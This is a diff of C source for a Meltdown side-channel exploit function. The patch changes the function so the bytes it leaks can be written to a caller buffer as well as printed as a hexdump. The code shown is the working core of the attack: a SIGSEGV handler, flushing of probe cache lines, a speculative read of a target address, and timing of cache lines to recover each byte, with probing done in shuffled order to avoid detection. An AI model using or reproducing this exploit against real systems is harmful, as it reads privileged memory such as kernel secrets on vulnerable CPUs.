@@ -157,17 +157,20 @@ meltdown_calibrate(void)
 static sigjmp_buf jmpenv;
 static void sighandler(int signo) { siglongjmp(jmpenv, signo); }
 void
-meltdown_attack(const uint8_t *addr, size_t len, unsigned int rounds)
+meltdown_attack(const void *targetp, void *bufp, size_t len,
+    unsigned int rounds)
 {
 	unsigned int hist[PROBE_NLINES];
 	uint8_t line[16];
+	const uint8_t *target = targetp;
+	uint8_t *buf = bufp;
 	sig_t sigsegv;
 	unsigned int i, r, v, xv;
 	int signo;
 	uint8_t b;
 
 	VERBOSEF("reading %zu bytes from %p with %u rounds\n",
-	    len, addr, rounds);
+	    len, target, rounds);
 	sigsegv = signal(SIGSEGV, sighandler);
 	for (i = 0; i < len; ++i) {
 		memset(hist, 0, sizeof hist);
@@ -180,7 +183,7 @@ meltdown_attack(const uint8_t *addr, size_t len, unsigned int rounds)
 			if ((signo = sigsetjmp(jmpenv, 1)) == 0) {
 				for (v = 0; v < PROBE_NLINES; ++v)
 					clflush(&probe[v * PROBE_LINELEN]);
-				spec_read(&addr[i], probe, PROBE_SHIFT);
+				spec_read(&target[i], probe, PROBE_SHIFT);
 			}
 			for (v = 0; v < PROBE_NLINES; ++v) {
 				xv = ((v * 167) + 13) % 256; /* dodge run detection */
@@ -197,13 +200,19 @@ meltdown_attack(const uint8_t *addr, size_t len, unsigned int rounds)
 				b = v;
 		}
 		VERYVERBOSEF(" | %u\n", b);
-		line[i % 16] = b;
-		/* output 16 bytes at a time */
-		if (i % 16 == 15)
-			hexdump(i - 15, line, 16);
+		if (buf == NULL) {
+			line[i % 16] = b;
+			/* output 16 bytes at a time */
+			if (i % 16 == 15)
+				hexdump(i - 15, line, 16);
+		} else {
+			buf[i] = b;
+		}
 	}
 	/* output any leftovers */
-	if (i % 16 > 0)
-		hexdump(i - i % 16, line, i % 16);
+	if (buf == NULL) {
+		if (i % 16 > 0)
+			hexdump(i - i % 16, line, i % 16);
+	}
 	signal(SIGSEGV, sigsegv);
 }
